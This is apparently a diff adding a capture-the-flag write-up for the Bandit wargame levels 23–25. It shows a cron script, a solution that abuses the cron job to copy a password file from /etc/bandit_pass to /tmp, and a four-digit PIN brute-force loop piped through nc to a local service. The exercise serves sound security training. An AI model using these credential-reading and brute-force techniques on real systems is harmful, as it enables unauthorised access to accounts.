@@ -1,0 +1,52 @@
+bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh 
+#!/bin/bash
+
+myname=$(whoami)
+
+cd /var/spool/$myname/foo
+echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
+for i in * .*;
+do
+    if [ "$i" != "." -a "$i" != ".." ];
+    then
+        echo "Handling $i"
+        owner="$(stat --format "%U" ./$i)"
+        if [ "${owner}" = "bandit23" ]; then
+            timeout -s 9 60 ./$i
+        fi
+        rm -f ./$i
+    fi
+done
+
+All passwords are available somehow in /etc/bandit_pass! Remember that!
+
+timeout is a command-line utility that runs a specified command and terminates it if it is still running after a given period of time. In other words, timeout allows you to run a command with a time limit. The timeout command is a part of the GNU core utilities package, which is installed on almost any Linux distribution.
+
+# My solution:
+--------------
+#!/usr/bin/bash
+
+echo Hi, I am running! > verify # this is to debug some permissions issues I was having
+output=/tmp/tmp.Stv8XYt71b/password
+cat /etc/bandit_pass/bandit24 > $output
+
+Solution to Level 24 -> Level 25:
+# Brute force script
+#!/usr/bin/bash
+
+for first in {0..9}
+do
+        for second in {0..9}
+        do
+                for third in {0..9}
+                do
+                        for fourth in {0..9}
+                        do
+                                echo $PASSWORD ${first}${second}${third}${fourth}
+                        done
+                done
+        done
+done
+
+# From shell:
+$ ./bandit25_pass.sh | nc localhost 30002
